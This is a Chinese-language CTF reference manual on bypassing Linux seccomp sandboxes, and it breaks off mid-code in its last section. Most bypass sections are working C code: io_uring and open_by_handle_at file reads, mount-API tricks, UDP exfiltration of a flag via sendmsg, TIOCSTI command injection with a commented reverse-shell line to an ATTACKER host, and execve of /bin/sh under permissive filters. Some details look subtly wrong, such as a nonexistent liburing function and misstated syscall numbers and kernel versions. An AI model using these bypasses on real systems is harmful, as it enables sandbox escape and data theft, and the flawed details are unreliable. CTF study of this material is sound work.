# Seccomp Bypass 技巧大全 (CTF 参考手册)

> 涵盖 seccomp 基础原理、检测方法及各类绕过技巧，适用于 CTF pwn 类型题目。

---

## 目录

1. [Seccomp 基础](#1-seccomp-基础)
2. [Seccomp 检测方法](#2-seccomp-检测方法)
3. [userfaultfd + io_uring 绕过](#3-userfaultfd--io_uring-绕过)
4. [open_by_handle_at 绕过](#4-open_by_handle_at-绕过)
5. [fsopen/open_tree/move_mount 绕过](#5-fsopenopen_treemove_mount-绕过)
6. [sendmsg UDP 绕过](#6-sendmsg-udp-绕过)
7. [TIOCSTI ioctl 绕过](#7-tiocsti-ioctl-绕过)
8. [PTRACE 绕过](#8-ptrace-绕过)
9. [Seccomp Permissive 检测](#9-seccomp-permissive-检测)
10. [2024-2026 新技术与趋势](#10-2024-2026-新技术与趋势)

---

## 1. Seccomp 基础

### 1.1 三种模式

| 模式 | 内核版本 | 说明 |
|------|---------|------|
| **Mode 0: Disabled** | — | 默认状态，无限制 |
| **Mode 1: Strict** | Linux 2.6.23+ | 仅允许 `read`, `write`, `exit`, `sigreturn` 四个系统调用 |
| **Mode 2: Filter** | Linux 3.5+ | 使用 BPF 程序自定义允许/拒绝的系统调用，最常用 |

### 1.2 设置方式

```c
// Strict 模式 —— 一旦设置不可撤销
seccomp(SECCOMP_SET_MODE_STRICT, 0, NULL, 0);

// 使用 prctl 进入 Filter 模式（传统方式）
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);  // 必须先设置 no_new_privs
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);

// 使用 seccomp() 系统调用（推荐）
seccomp(SECCOMP_SET_MODE_FILTER, 0, &prog);
```

### 1.3 BPF 过滤器结构

```c
#include <linux/seccomp.h>
#include <linux/filter.h>

// 经典 BPF 指令
struct sock_filter filter[] = {
    // 获取系统调用号（x86_64 在 arch 字段）
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),

    // 允许 open (syscall 2 on x86_64)
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_open, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),

    // 允许 write (syscall 1 on x86_64)
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),

    // 其他一律杀死
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
};

struct sock_fprog prog = {
    .len = sizeof(filter) / sizeof(filter[0]),
    .filter = filter,
};
```

### 1.4 返回值类型

| 返回值 | 行为 |
|--------|------|
| `SECCOMP_RET_KILL_PROCESS` | 杀死整个进程（推荐，Linux 3.5+） |
| `SECCOMP_RET_KILL_THREAD` | 杀死当前线程（旧版兼容） |
| `SECCOMP_RET_TRAP` | 发送 `SIGSYS` 信号给进程 |
| `SECCOMP_RET_ERRNO` | 返回指定 errno（最大 0xFFFF） |
| `SECCOMP_RET_USER_NOTIF` | 将决定权交给用户态通知者（`ioctl(SECCOMP_IOCTL_NOTIF_RECV)`） |
| `SECCOMP_RET_TRACE` | 通知 ptrace tracer |
| `SECCOMP_RET_LOG` | 记录日志但放行 |
| `SECCOMP_RET_ALLOW` | 允许 |

### 1.5 使用 libseccomp 的简化方式

```c
#include <seccomp.h>

scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);  // 默认行为：杀死

// 允许特定系统调用
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

// 带参数条件的规则：仅允许 write(1, ..., len) —— stdout
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1,
    SCMP_A0(SCMP_CMP_EQ, 1));  // fd == 1

// 加载并激活
seccomp_load(ctx);
seccomp_release(ctx);
```

---

## 2. Seccomp 检测方法

### 2.1 检测是否处于 Strict 模式

```c
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <stdio.h>
#include <unistd.h>

void detect_seccomp() {
    // 方法1：尝试 prctl 查询
    int ret = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
    if (ret == 0) {
        printf("seccomp: disabled\n");
    } else if (ret == 1) {
        printf("seccomp: strict mode\n");
    } else if (ret == 2) {
        printf("seccomp: filter mode\n");
    }

    // 方法2：检查 no_new_privs
    ret = prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0);
    printf("no_new_privs: %d\n", ret);

    // 方法3：检查 seccomp filter 是否存在（Linux 3.18+）
    // 通过读取 /proc/self/status
    FILE *f = fopen("/proc/self/status", "r");
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "Seccomp")) {
            printf("status: %s", line);
        }
        if (strstr(line, "NoNewPrivs")) {
            printf("status: %s", line);
        }
    }
    fclose(f);
}
```

### 2.2 探测被阻止的系统调用

```c
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

// 直接调用 syscall 来测试哪些被拦截
void probe_syscalls() {
    // 尝试一个通常被禁止的调用
    long ret = syscall(__NR_openat, -1, "/dev/null", 0);
    if (ret == -1) {
        if (errno == EACCES || errno == EPERM) {
            printf("openat 可能被 seccomp 阻止\n");
        } else {
            printf("openat 返回: %m (可能未被阻止)\n");
        }
    } else {
        printf("openat 被允许\n");
    }
}
```

### 2.3 /proc 文件系统检测

```bash
# 查看 seccomp 状态
cat /proc/self/status | grep -i seccomp
# Seccomp:    2        # 0=disabled, 1=strict, 2=filter
# Seccomp_filters: 1  # 过滤器数量 (Linux 4.14+)

# 查看 no_new_privs
cat /proc/self/status | grep NoNewPrivs
# NoNewPrivs: 1
```

### 2.4 利用 SIGSYS 信号检测

```c
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>

void sigsys_handler(int sig, siginfo_t *info, void *ucontext) {
    printf("收到 SIGSYS！系统调用 %d 被 seccomp 阻止\n",
           (int)info->si_syscall);
    // si_call_addr: 被拦截的系统调用地址
    // si_arch:      架构
    // si_syscall:   系统调用号
    exit(1);
}

void setup_sigsys_detection() {
    struct sigaction sa;
    sa.sa_sigaction = sigsys_handler;
    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSYS, &sa, NULL);
}
```

---

## 3. userfaultfd + io_uring 绕过

### 3.1 userfaultfd 原理

`userfaultfd` 允许用户态程序处理缺页异常，可以暂停线程的执行流。在 CTF 中常用于：
- 竞态条件利用
- 精确控制内存访问时序
- 在 seccomp 检查之前/之后执行代码

```c
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <unistd.h>
#include <stdio.h>
#include <pthread.h>

struct fault_args {
    int uffd;
    void *addr;
    size_t len;
};

void *fault_monitor(void *arg) {
    struct fault_args *fa = (struct fault_args *)arg;
    struct uffd_msg msg;

    while (1) {
        // 阻塞等待缺页事件
        read(fa->uffd, &msg, sizeof(msg));

        if (msg.event == UFFD_EVENT_PAGEFAULT) {
            printf("收到缺页事件 at 0x%lx\n",
                   msg.arg.pagefault.address);

            // 在此时可以：
            // 1. 修改寄存器状态（通过 PTRACE）
            // 2. 修改内存内容
            // 3. 有条件地解决缺页

            // 分配页面解决缺页
            struct uffdio_copy uc;
            void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            // ... 填充页面内容 ...
            uc.dst = (unsigned long)msg.arg.pagefault.address;
            uc.src = (unsigned long)page;
            uc.len = 4096;
            uc.mode = 0;
            ioctl(fa->uffd, UFFDIO_COPY, &uc);
            munmap(page, 4096);
        }
    }
    return NULL;
}

void setup_userfaultfd_demo() {
    // 创建 userfaultfd
    int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);

    // 设置 API
    struct uffdio_api api = { .api = UFFD_API };
    ioctl(uffd, UFFDIO_API, &api);

    // 注册内存区域
    size_t page_size = sysconf(_SC_PAGESIZE);
    void *addr = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                      -1, 0);

    struct uffdio_register reg = {
        .range = { .start = (unsigned long)addr, .len = page_size },
        .mode = UFFDIO_REGISTER_MODE_MISSING
    };
    ioctl(uffd, UFFDIO_REGISTER, &reg);

    // 创建监控线程
    struct fault_args fa = { .uffd = uffd, .addr = addr, .len = page_size };
    pthread_t tid;
    pthread_create(&tid, NULL, fault_monitor, &fa);

    // 访问页面将触发缺页
    // 在此处可以精确控制执行时序来绕过 seccomp
    volatile char c = *(volatile char *)addr;
}
```

### 3.2 io_uring + seccomp 绕过

`io_uring` 提供了异步 I/O 接口，可以绕过基于 seccomp 的系统调用过滤：

```c
#include <liburing.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

int io_uring_bypass_demo() {
    struct io_uring ring;

    // 初始化 io_uring（注意：io_uring_setup 本身可能被 seccomp 允许）
    io_uring_queue_init(32, &ring, 0);

    // io_uring 的提交队列不经过传统的 syscall 路径
    // 内核通过 SQ polling 线程执行实际 I/O，可能绕过 seccomp

    // 提交一个 openat 操作（通过 io_uring）
    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    io_uring_prep_openat(sqe, AT_FDCWD, "/flag",
                         O_RDONLY, 0);

    struct io_uring_cqe *cqe;
    io_uring_submitAndWait(&ring, &cqe);

    int fd = cqe->res;
    if (fd >= 0) {
        char buf[256] = {0};
        // 继续用 io_uring 读取
        sqe = io_uring_get_sqe(&ring);
        io_uring_prep_read(sqe, fd, buf, sizeof(buf) - 1, 0);
        io_uring_submitAndWait(&ring, &cqe);

        printf("flag: %s\n", buf);
        close(fd);
    }

    io_uring_queue_exit(&ring);
    return 0;
}
```

**io_uring 绕过原理：**

- `io_uring_enter` 系统调用本身可能被允许
- 实际的 open/read/write 操作由内核的 io_uring 工作线程完成
- 如果 seccomp 过滤器只拦截了 `openat`、`read` 等传统系统调用，但没有拦截 `io_uring_enter`（系统调号 425 on x86_64），则可以绕过

### 3.3 经典 userfaultfd 竞态利用模式

```c
// 核心思路：利用 userfaultfd 暂停程序执行，在关键检查点挂起
// 适用场景：fork 后、exec 前、seccomp 加载前的窗口

void *monitor_thread(void *arg) {
    // ... 等待缺页 ...

    // 当目标线程在某个关键点被挂起时：
    // - 修改堆上已被检查但尚未使用的数据
    // - 伪造 syscall 参数
    // - 在 seccomp 加载前完成危险操作

    return NULL;
}

void exploit_via_uffd() {
    void *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    // 注册 userfaultfd 监控 page
    // ...

    // 目标线程访问 page 时会被挂起
    // monitor_thread 此时可以安全执行绕过逻辑
    trigger_fault(page);
}
```

---

## 4. open_by_handle_at 绕过

### 4.1 原理

`open_by_handle_at`（系统调号 303 on x86_64）允许通过文件句柄（file handle）打开文件，绕过常规的路径遍历检查。如果 seccomp 过滤器没有拦截这个冷门系统调用，就可以用来读取任意文件。

前置条件：进程需要具有 `CAP_DAC_READ_SEARCH` 能力。

### 4.2 利用代码

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <linux/handle.h>
#include <limits.h>

// 通过 name_to_handle_at 获取文件句柄
struct file_handle *get_file_handle(const char *path) {
    struct file_handle *fh;
    int mnt_id;

    // 第一次调用获取所需大小
    fh = malloc(sizeof(*fh) + sizeof(handle_cookie_t));
    fh->handle_bytes = sizeof(handle_cookie_t);

    if (name_to_handle_at(AT_FDCWD, path, fh, &mnt_id, 0) == -1) {
        if (errno == EOVERFLOW) {
            fh = realloc(fh, sizeof(*fh) + fh->handle_bytes);
            if (name_to_handle_at(AT_FDCWD, path, fh, &mnt_id, 0) == -1) {
                perror("name_to_handle_at");
                free(fh);
                return NULL;
            }
        } else {
            perror("name_to_handle_at");
            free(fh);
            return NULL;
        }
    }

    printf("mount_id: %d, handle_bytes: %u\n", mnt_id, fh->handle_bytes);
    return fh;
}

int open_by_handle_bypass(const char *target_path) {
    // 需要特权（或在容器中可能已有 CAP_DAC_READ_SEARCH）
    // 也可以通过内核漏洞提升到此能力

    // 1. 在 /proc/self/fd 目录下获取 mount_id
    //    （对于容器场景，通常 mount_id 对应 /proc 或 /）
    int mnt_fd = open("/proc", O_RDONLY | O_DIRECTORY);
    if (mnt_fd < 0) {
        perror("open /proc");
        return -1;
    }

    // 2. 获取文件句柄
    struct file_handle *fh = get_file_handle(target_path);
    if (!fh) {
        close(mnt_fd);
        return -1;
    }

    // 3. 通过 open_by_handle_at 打开文件
    int fd = syscall(__NR_open_by_handle_at, mnt_fd, fh, O_RDONLY);
    if (fd < 0) {
        perror("open_by_handle_at");
        // 注意：可能需要 CAP_DAC_READ_SEARCH
        // 在某些 CTF 题目中可以通过其他漏洞先获取该能力
    } else {
        printf("成功打开文件 fd=%d\n", fd);

        char buf[256] = {0};
        read(fd, buf, sizeof(buf) - 1);
        printf("内容: %s\n", buf);
        close(fd);
    }

    close(mnt_fd);
    free(fh);
    return 0;
}
```

### 4.3 通过 /proc/self/fd 间接使用

```c
// 如果 seccomp 拦截了 open_by_handle_at，
// 但允许了 name_to_handle_at 和部分 open 操作：

// 策略：
// 1. 对一个已打开的 fd 使用 name_to_handle_at
// 2. 通过 /proc/self/fd/<n> 重新打开
// 3. 或使用 open_tree + move_mount 组合

// 适用于 seccomp 只限制了部分路径遍历的场景
```

---

## 5. fsopen/open_tree/move_mount 绕过

### 5.1 新挂载 API 概述

Linux 5.2+ 引入了新的挂载系统调用，传统 seccomp 过滤器通常不会覆盖这些新调用：

| 系统调用 | 号码 (x86_64) | 功能 |
|---------|---------------|------|
| `fsopen` | 430 | 打开一个超级块（文件系统实例） |
| `fsmount` | 432 | 创建一个挂载对象 |
| `fsconfig` | 431 | 配置文件系统参数 |
| `open_tree` | 428 | 打开/克隆一个挂载点 |
| `move_mount` | 429 | 移动挂载点 |
| `fchownat` | 260 | 变更文件所有权（配合使用） |

### 5.2 利用代码：通过挂载访问文件

```c
#define _GNU_SOURCE
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <string.h>

// 绕过示例：使用新挂载 API 访问受限路径
int mount_bypass_open(const char *source_fsname,
                      const char *target_path) {
    long fd;

    // Step 1: 使用 fsopen 打开文件系统
    fd = syscall(__NR_fsopen, source_fsname, FSOPEN_CLOEXEC);
    if (fd < 0) {
        perror("fsopen");
        return -1;
    }
    printf("fsopen fd: %ld\n", fd);

    // Step 2: 配置文件系统参数
    syscall(__NR_fsconfig, fd, FSCONFIG_SET_STRING, "source",
            target_path, 0);
    syscall(__NR_fsconfig, fd, FSCONFIG_CMD_CREATE, NULL, NULL, 0);

    // Step 3: 创建挂载对象
    int mnt_fd = syscall(__NR_fsmount, fd, FSMOUNT_CLOEXEC, 0);
    if (mnt_fd < 0) {
        perror("fsmount");
        close(fd);
        return -1;
    }

    // Step 4: 移动挂载到可访问的位置
    mkdir("/tmp/pwn", 0755);
    int at_fd = open("/tmp/pwn", O_RDONLY | O_DIRECTORY);
    syscall(__NR_move_mount, mnt_fd, "", at_fd, "",
            MOVE_MOUNT_F_EMPTY_PATH);

    // Step 5: 现在可以通过 /tmp/pwn 访问原始文件
    int file_fd = open("/tmp/pwn", O_RDONLY);
    char buf[256] = {0};
    read(file_fd, buf, sizeof(buf) - 1);
    printf("内容: %s\n", buf);

    close(file_fd);
    close(mnt_fd);
    close(fd);
    return 0;
}
```

### 5.3 open_tree 克隆挂载点

```c
// open_tree 可以克隆一个已有的挂载点
// 适用于需要在不修改原挂载点的情况下访问文件的场景

int open_tree_bypass(const char *mnt_path) {
    // 打开并克隆挂载点
    int fd = syscall(__NR_open_tree, AT_FDCWD, mnt_path,
                     OPEN_TREE_CLONE | AT_RECURSIVE);
    if (fd < 0) {
        perror("open_tree");
        return -1;
    }

    // 此时 fd 指向一个可以浏览克隆挂载的目录
    // 可以通过 fdlist 或迭代方式访问文件
    return fd;
}
```

### 5.4 结合 /proc 和 mount 绕过

```c
// 经典技巧：挂载 /proc 自身到新的位置
// 某些 seccomp 过滤器只检查特定路径前缀

void proc_mount_bypass() {
    mkdir("/tmp/procbypass", 0755);

    // 使用新挂载 API 将 proc 重新挂载
    int fd = syscall(__NR_fsopen, "proc", FSOPEN_CLOEXEC);
    syscall(__NR_fsconfig, fd, FSCONFIG_SET_STRING, "source", "/", 0);
    syscall(__NR_fsconfig, fd, FSCONFIG_CMD_CREATE, NULL, NULL, 0);
    int mnt_fd = syscall(__NR_fsmount, fd, FSMOUNT_CLOEXEC, 0);

    int at_fd = open("/tmp/procbypass", O_RDONLY | O_DIRECTORY);
    syscall(__NR_move_mount, mnt_fd, "", at_fd, "",
            MOVE_MOUNT_F_EMPTY_PATH);

    // 通过 /tmp/procbypass/self/status 访问进程信息
}
```

---

## 6. sendmsg UDP 绕过

### 6.1 原理

如果 seccomp 过滤器阻止了 `open`、`read` 等文件操作，但允许 `sendmsg`（系统调号 44 on x86_64），则可以将文件内容通过 UDP 发送到外部服务器。

`sendmsg` 的 `iovec` 可以指向任意内存区域，`cmsghdr` 中可以携带 `SCM_RIGHTS` 来传递文件描述符。

### 6.2 基本数据外泄

```c
#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/un.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

// 通过 sendmsg + UDP 外泄数据
int sendmsg_exfil(const char *data, size_t len,
                   const char *server_ip, int server_port) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    struct sockaddr_in dest = {
        .sin_family = AF_INET,
        .sin_port = htons(server_port),
    };
    inet_pton(AF_INET, server_ip, &dest.sin_addr);

    // 构造 iovec
    struct iovec iov = {
        .iov_base = (void *)data,
        .iov_len = len,
    };

    // 构造 msghdr
    struct msghdr msg = {
        .msg_name = &dest,
        .msg_namelen = sizeof(dest),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    ssize_t sent = sendmsg(sock, &msg, 0);
    printf("已发送 %zd 字节\n", sent);

    close(sock);
    return 0;
}

// 使用示例：读取 flag 后通过 UDP 外泄
void exfil_flag() {
    // 假设 flag 已在内存中
    char flag[256];
    // ... 通过某种方式获取 flag 到 flag[] ...

    // 注意：如果 read 被阻止，需要通过其他方式
    // 比如利用 ufd/userfaultfd 或已有的内存内容
    sendmsg_exfil(flag, strlen(flag), "10.0.0.1", 9999);
}
```

### 6.3 通过 SCM_RIGHTS 传递文件描述符

```c
// 通过 Unix domain socket + SCM_RIGHTS 传递文件描述符
// 适用于需要在两个进程间传递已打开 fd 的场景

int send_fd_via_sendmsg(int unix_sock, int fd_to_send) {
    struct msghdr msg = {0};
    struct cmsghdr *cmsg;
    char buf[CMSG_SPACE(sizeof(int))];
    char dummy = 'X';
    struct iovec io = {
        .iov_base = &dummy,
        .iov_len = 1,
    };

    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);

    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *(int *)CMSG_DATA(cmsg) = fd_to_send;

    return sendmsg(unix_sock, &msg, 0);
}

int recv_fd_via_sendmsg(int unix_sock) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    char dummy;
    struct iovec io = {
        .iov_base = &dummy,
        .iov_len = 1,
    };

    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);

    recvmsg(unix_sock, &msg, 0);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    return *(int *)CMSG_DATA(cmsg);
}
```

---

## 7. TIOCSTI ioctl 绕过

### 7.1 原理

`TIOCSTI`（`0x5412`）是终端 ioctl 命令，用于向终端注入字符。如果 seccomp 允许 `ioctl` 但没有过滤 `TIOCSTI`，可以向终端输入任意字符，效果等同于键盘输入。

这对于在受限 shell 中注入命令非常有效。

### 7.2 利用代码

```c
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void tiocsti_inject(const char *cmd) {
    for (int i = 0; cmd[i]; i++) {
        char c = cmd[i];
        ioctl(STDIN_FILENO, TIOCSTI, &c);
    }
    // 命令将在终端中执行
}

// 实际场景：容器逃逸后注入命令
void escape_via_tiocsti() {
    // 注入 cat /flag
    tiocsti_inject("cat /flag\n");

    // 注入反弹 shell
    // tiocsti_inject("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\n");
}
```

### 7.3 PTYS 场景下的利用

```c
// 在某些容器场景中，seccomp 过滤了 TIOCSTI
// 但可以通过 /dev/pts/ 间接访问

// 方法1：使用 openat + ioctl
int pts_fd = open("/dev/pts/0", O_RDWR);
if (pts_fd >= 0) {
    ioctl(pts_fd, TIOCSTI, &c);
    close(pts_fd);
}

// 方法2：如果 open 被阻止但 ioctl 被允许
// 可以通过 /proc/self/fd/N 获取已打开的 pts fd
```

### 7.4 TIOCGWINSZ / TIOCSCTTY 配合利用

```c
#include <sys/ioctl.h>
#include <termios.h>

// 有时需要先获取终端控制权
void set_controlling_tty(int tty_fd) {
    // 释放当前控制终端
    ioctl(tty_fd, TIOCNOTTY, 0);

    // 设置新的控制终端
    ioctl(tty_fd, TIOCSCTTY, 0);

    // 现在 TIOCSTI 可以注入到正确的终端
}
```

---

## 8. PTRACE 绕过

### 8.1 PTRACE_SECCOMP_GET_FILTER

Linux 5.5+ 提供了 `PTRACE_SECCOMP_GET_FILTER` 操作，允许 ptrace 追踪者读取被追踪进程的 seccomp BPF 过滤器。这可以用来逆向分析 seccomp 规则。

```c
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <linux/filter.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// 在子进程中 dump seccomp BPF 过滤器
void dump_seccomp_filter(pid_t child_pid) {
    struct sock_filter *filter;
    int nbytes;

    for (int idx = 0; ; idx++) {
        filter = malloc(4096);
        nbytes = ptrace(PTRACE_SECCOMP_GET_FILTER, child_pid,
                        idx, filter);
        if (nbytes < 0) {
            free(filter);
            if (idx == 0) {
                printf("没有 seccomp 过滤器\n");
            }
            break;
        }

        printf("=== 过滤器 #%d (%d 字节, %d 条指令) ===\n",
               idx, nbytes, nbytes / sizeof(struct sock_filter));

        // 打印每条 BPF 指令
        for (int i = 0; i < nbytes / sizeof(struct sock_filter); i++) {
            printf("  [%d] code=0x%04x jt=%d jf=%d k=%u\n",
                   i, filter[i].code, filter[i].jt,
                   filter[i].jf, filter[i].k);
        }

        free(filter);
    }
}
```

### 8.2 PTRACE 获取 seccomp 被拦截的系统调用

```c
// 通过 PTRACE_SYSCALL 监控子进程的系统调用
void trace_syscalls(pid_t child) {
    int status;
    waitpid(child, &status, 0);

    // 设置选项
    ptrace(PTRACE_SETOPTIONS, child, 0,
           PTRACE_O_TRACESECCOMP);

    // 让子进程继续，每次系统调用入口/出口会暂停
    while (1) {
        ptrace(PTRACE_SYSCALL, child, 0, 0);
        waitpid(child, &status, 0);

        if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
            // 在 Linux 5.3+，PTRACE_O_TRACESECCOMP
            // 会在 seccomp 允许系统调用时触发 SIGTRAP
            // （仅当 seccomp 返回 TRACE 时）
            long orig_rax = ptrace(PTRACE_PEEKUSER, child,
                                   8 * ORIG_RAX, NULL);
            printf("系统调用 %ld 允许通过\n", orig_rax);
        }

        if (WIFEXITED(status)) break;
    }
}
```

### 8.3 通过 PTRACE 修改内存绕过检查

```c
// 经典技巧：在 seccomp 加载后，通过 PTRACE 修改 BPF 程序
// 注意：这在较新的内核上通常被阻止

void ptrace_modify_seccomp(pid_t child) {
    // 附加到子进程
    ptrace(PTRACE_ATTACH, child, 0, 0);
    waitpid(child, NULL, 0);

    // 获取子进程内存映射
    // 找到 seccomp BPF 程序的内存区域

    // 方法：读取 /proc/<pid>/maps 找到 seccomp 相关区域
    // 但更实际的做法是修改 BPF 返回值

    // 例如：将 SECCOMP_RET_KILL 修改为 SECCOMP_RET_ALLOW
    // SECCOMP_RET_KILL_PROCESS = 0x00000000
    // SECCOMP_RET_ALLOW       = 0x7fff0000

    // 注意：现代内核会阻止对 seccomp 过滤器内存的修改
    // 但在某些旧版本或特殊配置下可能有效

    ptrace(PTRACE_DETACH, child, 0, 0);
}
```

### 8.4 利用 PTRACE_SECCOMP_GET_FILTER + 重建过滤器

```c
// CTF 实用技巧：
// 1. 使用 fork() 创建子进程
// 2. 子进程加载 seccomp
// 3. 父进程通过 PTRACE_SECCOMP_GET_FILTER 读取 BPF
// 4. 分析 BPF 找到允许的系统调用
// 5. 构造利用链

void analyze_seccomp(pid_t child) {
    // ... 等待子进程加载 seccomp ...

    // 获取并分析所有过滤器
    dump_seccomp_filter(child);

    // 分析哪些系统调用被允许：
    // - 寻找 SCMP_ACT_ALLOW 返回值
    // - 记录允许的 syscall number
    // - 利用允许的 syscall 构造攻击
}
```

---

## 9. Seccomp Permissive 检测

### 9.1 什么是 Permissive 模式

Seccomp 的 "permissive" 模式是指过滤器配置为仅记录但不阻止系统调用的模式：

- `SECCOMP_RET_LOG`：记录被拦截的系统调用，但仍然放行
- 某些实现中，过滤器可能配置不当，仅做了日志记录

这在 CTF 中很常见 —— 题目看似有 seccomp 保护，但实际上只是日志记录模式。

### 9.2 检测方法

```c
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

// 方法1：直接测试通常被禁止的系统调用
void detect_permissive() {
    // 尝试一个通常会被 seccomp 禁止的调用
    // 例如：execve
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};

    // 如果 seccomp 是 permissive，execve 会成功
    // 如果是 blocking，我们会收到 SIGSYS 或 EPERM

    // 先 fork 防止崩溃
    pid_t pid = fork();
    if (pid == 0) {
        // 子进程中测试
        long ret = syscall(__NR_execve, "/bin/sh", argv, envp);
        // 如果到了这里，说明 execve 被允许（permissive 或无 seccomp）
        printf("execve 成功！seccomp 可能是 permissive 模式\n");
        _exit(0);
    } else {
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status) && WTERMSIG(status) == SIGSYS) {
            printf("收到 SIGSYS —— seccomp 是 blocking 模式\n");
        } else if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            printf("子进程正常退出 —— 可能是 permissive 模式\n");
        }
    }
}

// 方法2：检查 dmesg 中的 seccomp 日志
// 在允许的情况下检查：
void check_dmesg_log() {
    // 如果 seccomp 使用 SECCOMP_RET_LOG，
    // 系统调用会被记录在 dmesg/syslog 中
    system("dmesg | grep seccomp");
}
```

### 9.3 利用 Permissive 模式

```c
// 如果检测到 permissive 模式，直接执行需要的系统调用即可
void exploit_permissive() {
    // 系统调用实际上不会被阻止
    // 只是会被记录到审计日志

    // 直接执行
    char *argv[] = {"/bin/sh", NULL};
    syscall(__NR_execve, "/bin/sh", argv, NULL);

    // 或者直接读文件
    char buf[256];
    int fd = syscall(__NR_openat, AT_FDCWD, "/flag", O_RDONLY);
    syscall(__NR_read, fd, buf, sizeof(buf));
    syscall(__NR_write, STDOUT_FILENO, buf, strlen(buf));
}
```

### 9.4 利用 SECCOMP_RET_USER_NOTIF 延迟处理

```c
// 某些场景下，seccomp 使用 SECCOMP_RET_USER_NOTIF
// 将决策权交给另一个进程（监听进程）

// 作为攻击者，可以：
// 1. 等待通知
// 2. 在通知处理中返回 ALLOW
// 3. 从而绕过过滤

// 作为利用者，可以利用这个时序窗口
// 在过滤器检查和实际执行之间做竞态

// 监听端代码（通常是题目中的受保护进程的辅助部分）
void seccomp_notify_listener(int notify_fd) {
    struct seccomp_notif *req = NULL;
    struct seccomp_notif_resp *resp = NULL;
    seccomp_notif_alloc(&req, &resp);

    while (1) {
        // 等待需要决策的系统调用
        if (seccomp_notif_receive(notify_fd, req, &resp) == 0) {
            printf("收到通知: syscall=%d, pid=%d\n",
                   req->data.nr, req->pid);

            // 检查是否可以放行
            if (req->data.nr == __NR_execve) {
                // 简单放行或做更复杂的检查
                resp->error = 0;
                resp->val = 0;
            } else {
                // 默认阻止
                resp->error = -EPERM;
            }

            seccomp_notif_send(notify_fd, resp);
        }
    }

    seccomp_notif_free(req, resp);
}
```

---

## 10. 2024-2026 新技术与趋势

### 10.1 Landlock LSM 绕过（2024-2025）

Landlock 是较新的 Linux 安全模块（非强制性），在 CTF 题目中与 seccomp 配合使用：

```c
// Landlock 用于文件系统沙箱
// 与 seccomp 互补：seccomp 过滤系统调用，Landlock 限制文件访问

// 绕过思路：
// 1. Landlock 规则通常在进程启动时加载
// 2. 通过 fork/clone 创建的子进程会继承 Landlock 规则
// 3. 但某些系统调用（如 io_uring 操作）可能不经过 Landlock 检查

#include <linux/landlock.h>
#include <sys/syscall.h>

void detect_landlock() {
    // 检查 Landlock 是否生效
    struct landlock_ruleset_attr attr = {
        .handled_access_fs = LANDLOCK_ACCESS_FS_READ_FILE,
    };
    int fd = syscall(__NR_landlock_create_ruleset, &attr,
                     sizeof(attr), 0);
    if (fd < 0) {
        printf("Landlock 不可用或被禁止\n");
    } else {
